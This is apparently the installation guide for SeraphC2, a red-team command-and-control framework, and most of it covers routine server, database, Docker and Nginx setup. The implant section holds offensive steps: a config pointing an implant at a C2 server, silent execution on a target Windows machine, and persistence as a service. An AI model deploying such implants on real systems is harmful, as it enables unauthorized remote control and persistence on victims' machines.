# SeraphC2 Complete Installation Guide

This comprehensive guide covers the complete installation and setup of the SeraphC2 Command and Control framework, including all components: C2 Server, Web Client, Windows Implant, and supporting infrastructure.

## Table of Contents

1. [System Requirements](#system-requirements)
2. [Infrastructure Setup](#infrastructure-setup)
3. [C2 Server Installation](#c2-server-installation)
4. [Web Client Installation](#web-client-installation)
5. [Windows Implant Installation](#windows-implant-installation)
6. [Database Setup](#database-setup)
7. [Redis Setup](#redis-setup)
8. [Docker Installation](#docker-installation)
9. [Production Deployment](#production-deployment)
10. [Security Configuration](#security-configuration)
11. [Troubleshooting](#troubleshooting)

---

## System Requirements

### C2 Server Requirements

- **Operating System**: Linux (Ubuntu 20.04+, CentOS 8+, RHEL 8+) or Windows 10/11
- **Node.js**: Version 18.0 or higher
- **Memory**: Minimum 4GB RAM (8GB+ recommended for production)
- **Storage**: Minimum 20GB free space (100GB+ recommended for production)
- **Network**: Static IP address and open ports (see [Network Configuration](#network-configuration))

### Database Requirements

- **PostgreSQL**: Version 13 or higher
- **Memory**: Minimum 2GB RAM dedicated to PostgreSQL
- **Storage**: Minimum 10GB for database files

### Cache Requirements

- **Redis**: Version 6 or higher
- **Memory**: Minimum 1GB RAM dedicated to Redis

### Windows Implant Requirements

- **Operating System**: Windows 10/11, Windows Server 2016+
- **.NET Runtime**: .NET 6.0 or higher (included in build)
- **Architecture**: x64 (x86 support available)

---

## Infrastructure Setup

### Network Configuration

Ensure the following ports are available and properly configured:

| Component | Port | Protocol | Purpose |
|-----------|------|----------|---------|
| C2 Server | 3000 | HTTP/HTTPS | Main API and Web Interface |
| C2 Server | 8080 | HTTP | Implant Communication |
| C2 Server | 8443 | HTTPS | Secure Implant Communication |
| PostgreSQL | 5432 | TCP | Database Connection |
| Redis | 6379 | TCP | Cache Connection |
| DNS (Optional) | 53 | UDP | DNS Tunneling |

### Firewall Configuration

#### Linux (UFW)
```bash
# Allow SSH (if remote)
sudo ufw allow 22

# Allow C2 Server ports
sudo ufw allow 3000
sudo ufw allow 8080
sudo ufw allow 8443

# Allow database access (if external)
sudo ufw allow from [TRUSTED_IP] to any port 5432
sudo ufw allow from [TRUSTED_IP] to any port 6379

# Enable firewall
sudo ufw enable
```

#### Windows Firewall
```powershell
# Allow C2 Server ports
New-NetFirewallRule -DisplayName "SeraphC2 Main" -Direction Inbound -Port 3000 -Protocol TCP -Action Allow
New-NetFirewallRule -DisplayName "SeraphC2 HTTP" -Direction Inbound -Port 8080 -Protocol TCP -Action Allow
New-NetFirewallRule -DisplayName "SeraphC2 HTTPS" -Direction Inbound -Port 8443 -Protocol TCP -Action Allow
```

---

## C2 Server Installation

### Method 1: Manual Installation (Recommended for Development)

#### Step 1: Install Node.js

**Ubuntu/Debian:**
```bash
# Update package index
sudo apt update

# Install Node.js 18.x
curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
sudo apt-get install -y nodejs

# Verify installation
node --version
npm --version
```

**CentOS/RHEL:**
```bash
# Install Node.js 18.x
curl -fsSL https://rpm.nodesource.com/setup_18.x | sudo bash -
sudo yum install -y nodejs

# Verify installation
node --version
npm --version
```

**Windows:**
1. Download Node.js from https://nodejs.org/
2. Run the installer and follow the setup wizard
3. Verify installation in Command Prompt:
```cmd
node --version
npm --version
```

#### Step 2: Clone and Setup SeraphC2

```bash
# Clone the repository
git clone https://github.com/seraphc2/seraphc2.git
cd seraphc2

# Install server dependencies
npm install

# Install web client dependencies
cd web-client
npm install
cd ..
```

#### Step 3: Configure Environment

```bash
# Copy environment template
cp .env.example .env

# Edit configuration (see Configuration section below)
nano .env  # or your preferred editor
```

#### Step 4: Build the Project

```bash
# Build server
npm run build

# Build web client
npm run build:web
```

#### Step 5: Database Setup (see [Database Setup](#database-setup))

#### Step 6: Start the Server

```bash
# Development mode (with hot reload)
npm run dev

# Production mode
npm run start:prod
```

### Method 2: Docker Installation (Recommended for Production)

See [Docker Installation](#docker-installation) section below.

---

## Web Client Installation

The web client is automatically built and served by the C2 server. However, for development or standalone deployment:

### Development Setup

```bash
# Navigate to web client directory
cd web-client

# Install dependencies
npm install

# Start development server
npm start
```

The web client will be available at `http://localhost:3001` and will proxy API requests to the C2 server.

### Production Build

```bash
# Build for production
cd web-client
npm run build

# Files will be built to web-client/build/
# These are automatically served by the C2 server
```

### Standalone Deployment

If deploying the web client separately (e.g., to a CDN):

```bash
# Build the client
npm run build

# Deploy the build/ directory to your web server
# Update the API endpoint in the client configuration
```

---

## Windows Implant Installation

### Prerequisites

#### Install .NET SDK

**Windows:**
1. Download .NET 6.0 SDK from https://dotnet.microsoft.com/download
2. Run the installer and follow the setup wizard
3. Verify installation:
```cmd
dotnet --version
```

**Linux (for cross-compilation):**
```bash
# Ubuntu/Debian
wget https://packages.microsoft.com/config/ubuntu/20.04/packages-microsoft-prod.deb -O packages-microsoft-prod.deb
sudo dpkg -i packages-microsoft-prod.deb
sudo apt-get update
sudo apt-get install -y dotnet-sdk-6.0
```

### Building the Implant

#### Method 1: Using Build Script (Windows)

```powershell
# Navigate to implant directory
cd implant

# Run build script
.\build.ps1

# Built executable will be in implant/bin/Release/
```

#### Method 2: Manual Build

```bash
# Navigate to implant directory
cd implant

# Restore dependencies
dotnet restore

# Build the solution
dotnet build -c Release

# Publish as single executable
dotnet publish -c Release -r win-x64 --self-contained true -p:PublishSingleFile=true -o ./bin/publish/
```

#### Method 3: Cross-Platform Build (Linux to Windows)

```bash
# Install Windows targeting pack
sudo apt-get install -y dotnet-targeting-pack-6.0

# Build for Windows x64
cd implant
dotnet publish -c Release -r win-x64 --self-contained true -p:PublishSingleFile=true -o ./bin/publish-win-x64/

# Build for Windows x86
dotnet publish -c Release -r win-x86 --self-contained true -p:PublishSingleFile=true -o ./bin/publish-win-x86/
```

### Implant Configuration

Before building, configure the implant settings in `implant/SeraphC2.Implant/ImplantConfig.cs`:

```csharp
public static class ImplantConfig
{
    public static string ServerUrl = "http://your-c2-server.com:8080";
    public static int CallbackInterval = 30; // seconds
    public static int RequestTimeout = 30; // seconds
    public static string UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
}
```

### Deployment

1. **Transfer the built executable** to the target Windows system
2. **Execute the implant**:
```cmd
# Run directly
SeraphC2.Implant.exe

# Run silently (background)
start /B SeraphC2.Implant.exe

# Run as service (requires additional setup)
sc create SeraphC2 binPath= "C:\path\to\SeraphC2.Implant.exe"
sc start SeraphC2
```

---

## Database Setup

### PostgreSQL Installation

#### Ubuntu/Debian

```bash
# Update package index
sudo apt update

# Install PostgreSQL
sudo apt install postgresql postgresql-contrib

# Start and enable PostgreSQL
sudo systemctl start postgresql
sudo systemctl enable postgresql

# Verify installation
sudo systemctl status postgresql
```

#### CentOS/RHEL

```bash
# Install PostgreSQL
sudo yum install postgresql-server postgresql-contrib

# Initialize database
sudo postgresql-setup initdb

# Start and enable PostgreSQL
sudo systemctl start postgresql
sudo systemctl enable postgresql
```

#### Windows

1. Download PostgreSQL from https://www.postgresql.org/download/windows/
2. Run the installer and follow the setup wizard
3. Remember the password you set for the `postgres` user

### Database Configuration

#### Create Database and User

```bash
# Switch to postgres user
sudo -u postgres psql

# Create database and user
CREATE DATABASE seraphc2;
CREATE USER seraphc2 WITH ENCRYPTED PASSWORD 'your_secure_password';
GRANT ALL PRIVILEGES ON DATABASE seraphc2 TO seraphc2;

# Exit psql
\q
```

#### Configure PostgreSQL

Edit PostgreSQL configuration files:

**postgresql.conf** (usually in `/etc/postgresql/13/main/` or `/var/lib/pgsql/data/`):
```ini
# Connection settings
listen_addresses = 'localhost'  # or '*' for all interfaces
port = 5432
max_connections = 100

# Memory settings
shared_buffers = 256MB
effective_cache_size = 1GB
work_mem = 4MB
```

**pg_hba.conf**:
```ini
# Allow local connections
local   all             all                                     peer
host    all             all             127.0.0.1/32            md5
host    all             all             ::1/128                 md5
```

#### Restart PostgreSQL

```bash
sudo systemctl restart postgresql
```

### Run Database Migrations

```bash
# From SeraphC2 root directory
npm run migrate:up
```

---

## Redis Setup

### Redis Installation

#### Ubuntu/Debian

```bash
# Update package index
sudo apt update

# Install Redis
sudo apt install redis-server

# Start and enable Redis
sudo systemctl start redis-server
sudo systemctl enable redis-server

# Verify installation
redis-cli ping
```

#### CentOS/RHEL

```bash
# Install EPEL repository
sudo yum install epel-release

# Install Redis
sudo yum install redis

# Start and enable Redis
sudo systemctl start redis
sudo systemctl enable redis
```

#### Windows

1. Download Redis for Windows from https://github.com/microsoftarchive/redis/releases
2. Extract and run `redis-server.exe`
3. Or use Windows Subsystem for Linux (WSL) and follow Linux instructions

### Redis Configuration

Edit Redis configuration file (`/etc/redis/redis.conf` or `redis.conf`):

```ini
# Bind to localhost (or specific IPs)
bind 127.0.0.1

# Set password (recommended)
requirepass your_secure_redis_password

# Memory management
maxmemory 1gb
maxmemory-policy allkeys-lru

# Persistence
save 900 1
save 300 10
save 60 10000

# Log level
loglevel notice
logfile /var/log/redis/redis-server.log
```

#### Restart Redis

```bash
sudo systemctl restart redis-server
```

---

## Docker Installation

### Prerequisites

#### Install Docker and Docker Compose

**Ubuntu/Debian:**
```bash
# Update package index
sudo apt update

# Install Docker
sudo apt install docker.io docker-compose

# Start and enable Docker
sudo systemctl start docker
sudo systemctl enable docker

# Add user to docker group
sudo usermod -aG docker $USER
newgrp docker
```

**CentOS/RHEL:**
```bash
# Install Docker
sudo yum install -y yum-utils
sudo yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo
sudo yum install docker-ce docker-ce-cli containerd.io docker-compose-plugin

# Start and enable Docker
sudo systemctl start docker
sudo systemctl enable docker
```

**Windows:**
1. Download Docker Desktop from https://www.docker.com/products/docker-desktop
2. Install and follow the setup wizard
3. Ensure WSL 2 is enabled

### Development Deployment

```bash
# Clone repository
git clone https://github.com/seraphc2/seraphc2.git
cd seraphc2

# Copy environment file
cp .env.example .env

# Edit configuration as needed
nano .env

# Start all services
docker-compose up -d

# View logs
docker-compose logs -f

# Stop services
docker-compose down
```

### Production Deployment

```bash
# Use production compose file
cp .env.production.example .env

# Edit production configuration
nano .env

# Start production services
docker-compose -f docker-compose.prod.yml up -d

# View logs
docker-compose -f docker-compose.prod.yml logs -f
```

### Docker Services

The Docker setup includes:

- **seraphc2-server**: Main C2 server application
- **postgres**: PostgreSQL database
- **redis**: Redis cache
- **nginx**: Reverse proxy (production only)

### Docker Management Commands

```bash
# View running containers
docker-compose ps

# View logs for specific service
docker-compose logs seraphc2-server

# Restart a service
docker-compose restart seraphc2-server

# Update and rebuild
docker-compose pull
docker-compose up -d --build

# Clean up
docker-compose down -v  # Removes volumes (data loss!)
docker system prune -a  # Clean up unused images
```

---

## Production Deployment

### Environment Configuration

#### Production Environment Variables

Copy and configure the production environment:

```bash
cp .env.production.example .env
```

**Critical settings to change:**

```bash
# Environment
NODE_ENV=production

# Security - MUST CHANGE THESE!
JWT_SECRET=your_secure_jwt_secret_32_characters_minimum
ENCRYPTION_KEY=your_secure_encryption_key_32_characters_minimum

# Database
DB_HOST=your-production-db-host
DB_PASSWORD=your_secure_database_password

# Redis
REDIS_HOST=your-production-redis-host
REDIS_PASSWORD=your_secure_redis_password

# SSL/TLS
SSL_CERT_PATH=/path/to/your/ssl/certificate.crt
SSL_KEY_PATH=/path/to/your/ssl/private.key
```

#### Generate Secure Secrets

```bash
# Generate JWT secret
openssl rand -base64 32

# Generate encryption key
openssl rand -base64 32

# Generate database password
openssl rand -base64 24
```

### SSL/TLS Certificate Setup

#### Option 1: Let's Encrypt (Recommended)

```bash
# Install Certbot
sudo apt install certbot

# Generate certificate
sudo certbot certonly --standalone -d your-domain.com

# Certificates will be in /etc/letsencrypt/live/your-domain.com/
```

#### Option 2: Self-Signed Certificate (Development/Testing)

```bash
# Create certificate directory
mkdir -p certificates

# Generate private key
openssl genrsa -out certificates/server.key 2048

# Generate certificate
openssl req -new -x509 -key certificates/server.key -out certificates/server.crt -days 365
```

### Reverse Proxy Setup (Nginx)

#### Install Nginx

```bash
# Ubuntu/Debian
sudo apt install nginx

# CentOS/RHEL
sudo yum install nginx
```

#### Configure Nginx

Create `/etc/nginx/sites-available/seraphc2`:

```nginx
server {
    listen 80;
    server_name your-domain.com;
    return 301 https://$server_name$request_uri;
}

server {
    listen 443 ssl http2;
    server_name your-domain.com;

    ssl_certificate /etc/letsencrypt/live/your-domain.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/your-domain.com/privkey.pem;

    # SSL configuration
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers ECDHE-RSA-AES256-GCM-SHA512:DHE-RSA-AES256-GCM-SHA512:ECDHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES256-GCM-SHA384;
    ssl_prefer_server_ciphers off;

    # Security headers
    add_header X-Frame-Options DENY;
    add_header X-Content-Type-Options nosniff;
    add_header X-XSS-Protection "1; mode=block";
    add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload";

    location / {
        proxy_pass http://localhost:3000;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_cache_bypass $http_upgrade;
    }

    # Implant communication endpoints
    location /api/implants/ {
        proxy_pass http://localhost:8080;
        proxy_http_version 1.1;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
}
```

#### Enable Site

```bash
# Enable site
sudo ln -s /etc/nginx/sites-available/seraphc2 /etc/nginx/sites-enabled/

# Test configuration
sudo nginx -t

# Restart Nginx
sudo systemctl restart nginx
```

### Process Management (PM2)

#### Install PM2

```bash
npm install -g pm2
```

#### Create PM2 Configuration

Create `ecosystem.config.js`:

```javascript
module.exports = {
  apps: [{
    name: 'seraphc2',
    script: 'dist/index.js',
    instances: 'max',
    exec_mode: 'cluster',
    env: {
      NODE_ENV: 'production',
      PORT: 3000
    },
    error_file: 'logs/pm2-error.log',
    out_file: 'logs/pm2-out.log',
    log_file: 'logs/pm2-combined.log',
    time: true,
    max_memory_restart: '1G',
    node_args: '--max-old-space-size=1024'
  }]
};
```

#### Start with PM2

```bash
# Start application
pm2 start ecosystem.config.js

# Save PM2 configuration
pm2 save

# Setup startup script
pm2 startup

# Monitor
pm2 monit
```

---

## Security Configuration

### Database Security

#### PostgreSQL Security

```sql
-- Connect as postgres user
sudo -u postgres psql

-- Create dedicated user with limited privileges
CREATE USER seraphc2_app WITH ENCRYPTED PASSWORD 'secure_password';
GRANT CONNECT ON DATABASE seraphc2 TO seraphc2_app;
GRANT USAGE ON SCHEMA public TO seraphc2_app;
GRANT SELECT, INSERT, UPDATE, DELETE ON ALL TABLES IN SCHEMA public TO seraphc2_app;
GRANT USAGE, SELECT ON ALL SEQUENCES IN SCHEMA public TO seraphc2_app;

-- Enable SSL
ALTER SYSTEM SET ssl = on;
ALTER SYSTEM SET ssl_cert_file = '/path/to/server.crt';
ALTER SYSTEM SET ssl_key_file = '/path/to/server.key';

-- Restart PostgreSQL
```

#### Redis Security

```bash
# Edit redis.conf
sudo nano /etc/redis/redis.conf

# Add these settings:
requirepass your_secure_redis_password
rename-command FLUSHDB ""
rename-command FLUSHALL ""
rename-command DEBUG ""
rename-command CONFIG "CONFIG_b835729c9c"
```

### Application Security

#### Environment Variables Security

```bash
# Set proper file permissions
chmod 600 .env

# Use a secrets management system in production
# Examples: AWS Secrets Manager, HashiCorp Vault, Azure Key Vault
```

#### Log Security

```bash
# Create log directory with proper permissions
sudo mkdir -p /var/log/seraphc2
sudo chown seraphc2:seraphc2 /var/log/seraphc2
sudo chmod 750 /var/log/seraphc2

# Setup log rotation
sudo nano /etc/logrotate.d/seraphc2
```

Add to logrotate configuration:
```
/var/log/seraphc2/*.log {
    daily
    missingok
    rotate 30
    compress
    delaycompress
    notifempty
    create 640 seraphc2 seraphc2
    postrotate
        systemctl reload seraphc2 > /dev/null 2>&1 || true
    endscript
}
```

### Network Security

#### Firewall Configuration

```bash
# Allow only necessary ports
sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw allow ssh
sudo ufw allow 80/tcp
sudo ufw allow 443/tcp
sudo ufw enable
```

#### Fail2Ban Setup

```bash
# Install Fail2Ban
sudo apt install fail2ban

# Configure for SeraphC2
sudo nano /etc/fail2ban/jail.local
```

Add configuration:
```ini
[seraphc2]
enabled = true
port = 80,443,8080,8443
filter = seraphc2
logpath = /var/log/seraphc2/access.log
maxretry = 5
bantime = 3600
```

---

## Troubleshooting

### Common Issues

#### 1. Database Connection Issues

**Symptoms:**
- "Connection refused" errors
- "Authentication failed" errors

**Solutions:**
```bash
# Check PostgreSQL status
sudo systemctl status postgresql

# Check PostgreSQL logs
sudo tail -f /var/log/postgresql/postgresql-13-main.log

# Test connection
psql -h localhost -U seraphc2 -d seraphc2

# Check pg_hba.conf configuration
sudo nano /etc/postgresql/13/main/pg_hba.conf
```

#### 2. Redis Connection Issues

**Symptoms:**
- "Redis connection failed" errors
- Session data not persisting

**Solutions:**
```bash
# Check Redis status
sudo systemctl status redis-server

# Test Redis connection
redis-cli ping

# Check Redis logs
sudo tail -f /var/log/redis/redis-server.log

# Test with password
redis-cli -a your_password ping
```

#### 3. Port Binding Issues

**Symptoms:**
- "Port already in use" errors
- "EADDRINUSE" errors

**Solutions:**
```bash
# Check what's using the port
sudo netstat -tulpn | grep :3000
sudo lsof -i :3000

# Kill process using port
sudo kill -9 [PID]

# Change port in configuration
nano .env
# Update PORT=3001
```

#### 4. Permission Issues

**Symptoms:**
- "Permission denied" errors
- File access errors

**Solutions:**
```bash
# Fix file permissions
sudo chown -R $USER:$USER /path/to/seraphc2
chmod -R 755 /path/to/seraphc2

# Fix log directory permissions
sudo mkdir -p logs
sudo chown -R $USER:$USER logs
chmod -R 755 logs
```

#### 5. SSL Certificate Issues

**Symptoms:**
- "Certificate not found" errors
- SSL handshake failures

**Solutions:**
```bash
# Check certificate files exist
ls -la /path/to/certificates/

# Verify certificate
openssl x509 -in certificate.crt -text -noout

# Check certificate permissions
chmod 644 certificate.crt
chmod 600 private.key
```

### Debugging Commands

#### Check Service Status

```bash
# Check all services
docker-compose ps

# Check specific service logs
docker-compose logs seraphc2-server

# Check system resources
htop
df -h
free -h
```

#### Database Debugging

```bash
# Connect to database
psql -h localhost -U seraphc2 -d seraphc2

# Check tables
\dt

# Check connections
SELECT * FROM pg_stat_activity;

# Check database size
SELECT pg_size_pretty(pg_database_size('seraphc2'));
```

#### Application Debugging

```bash
# Check application logs
tail -f logs/combined.log

# Check error logs
tail -f logs/error.log

# Check process status
ps aux | grep node

# Check network connections
netstat -tulpn | grep node
```

### Performance Optimization

#### Database Optimization

```sql
-- Analyze database performance
ANALYZE;

-- Check slow queries
SELECT query, mean_time, calls 
FROM pg_stat_statements 
ORDER BY mean_time DESC 
LIMIT 10;

-- Update statistics
VACUUM ANALYZE;
```

#### Redis Optimization

```bash
# Check Redis memory usage
redis-cli info memory

# Check Redis performance
redis-cli --latency

# Monitor Redis commands
redis-cli monitor
```

#### Application Optimization

```bash
# Monitor Node.js performance
npm install -g clinic
clinic doctor -- node dist/index.js

# Check memory usage
node --inspect dist/index.js
```

---

## Maintenance

### Regular Maintenance Tasks

#### Daily Tasks

```bash
# Check service status
systemctl status seraphc2
systemctl status postgresql
systemctl status redis-server

# Check disk space
df -h

# Check logs for errors
grep -i error /var/log/seraphc2/*.log
```

#### Weekly Tasks

```bash
# Update system packages
sudo apt update && sudo apt upgrade

# Backup database
pg_dump -h localhost -U seraphc2 seraphc2 > backup_$(date +%Y%m%d).sql

# Rotate logs
sudo logrotate -f /etc/logrotate.d/seraphc2

# Check SSL certificate expiration
openssl x509 -in /path/to/certificate.crt -noout -dates
```

#### Monthly Tasks

```bash
# Update Node.js dependencies
npm audit
npm update

# Analyze database performance
psql -h localhost -U seraphc2 -d seraphc2 -c "VACUUM ANALYZE;"

# Review security logs
sudo grep -i "failed\|error\|denied" /var/log/auth.log

# Test backup restoration
# (Perform in staging environment)
```

### Backup and Recovery

#### Database Backup

```bash
# Create backup script
cat > /usr/local/bin/backup-seraphc2.sh << 'EOF'
#!/bin/bash
BACKUP_DIR="/var/backups/seraphc2"
DATE=$(date +%Y%m%d_%H%M%S)

mkdir -p $BACKUP_DIR

# Database backup
pg_dump -h localhost -U seraphc2 seraphc2 | gzip > $BACKUP_DIR/db_$DATE.sql.gz

# Configuration backup
tar -czf $BACKUP_DIR/config_$DATE.tar.gz .env docker-compose*.yml

# Remove backups older than 30 days
find $BACKUP_DIR -name "*.gz" -mtime +30 -delete

echo "Backup completed: $DATE"
EOF

chmod +x /usr/local/bin/backup-seraphc2.sh

# Add to crontab for daily backups
echo "0 2 * * * /usr/local/bin/backup-seraphc2.sh" | crontab -
```

#### Recovery Procedure

```bash
# Stop services
systemctl stop seraphc2

# Restore database
gunzip -c /var/backups/seraphc2/db_YYYYMMDD_HHMMSS.sql.gz | psql -h localhost -U seraphc2 seraphc2

# Restore configuration
tar -xzf /var/backups/seraphc2/config_YYYYMMDD_HHMMSS.tar.gz

# Start services
systemctl start seraphc2
```

---

## Support and Documentation

### Additional Resources

- **Project Repository**: https://github.com/seraphc2/seraphc2
- **Documentation**: See `docs/` directory
- **API Documentation**: Available at `/api/docs` when server is running
- **Issue Tracker**: GitHub Issues

### Getting Help

1. **Check the logs** first for error messages
2. **Review this installation guide** for common solutions
3. **Search existing issues** on GitHub
4. **Create a new issue** with detailed information:
   - Operating system and version
   - Node.js version
   - Error messages and logs
   - Steps to reproduce the issue

### Contributing

See `CONTRIBUTING.md` for guidelines on contributing to the project.

---

**⚠️ SECURITY DISCLAIMER**

SeraphC2 is designed for authorized security testing and research purposes only. Users are responsible for ensuring compliance with applicable laws and regulations. The authors and contributors are not responsible for any misuse or damage caused by this software.

Always ensure you have proper authorization before using this tool in any environment.